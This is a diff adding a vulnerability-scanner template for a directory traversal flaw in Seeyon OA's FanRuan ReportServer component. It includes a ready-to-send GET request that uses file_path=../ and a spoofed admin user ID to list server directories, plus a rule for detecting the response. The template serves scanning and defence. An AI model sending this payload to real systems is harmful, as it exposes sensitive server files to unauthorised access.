@@ -1,0 +1,19 @@
+id: seeyon-fanruan-report-server-directory-travesal
+
+info:
+  name: 致远OA 帆软组件 ReportServer 目录遍历漏洞
+  author: zan8in
+  severity: high
+  description: |
+    致远OA 帆软组件 ReportServer接口存在目录遍历漏洞，攻击者通过漏洞可以获取服务器敏感信息
+    title="致远A8-V5协同管理软件 V6.1sp1"
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20%E5%B8%86%E8%BD%AF%E7%BB%84%E4%BB%B6%20ReportServer%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
+    expression: response.status == 200 && response.body.bcontains(b'<NODES') && response.body.bcontains(b'</NODES>') && response.body.bcontains(b'xmlVersion') && response.body.bcontains(b'releaseVersion')
+expression: r0()
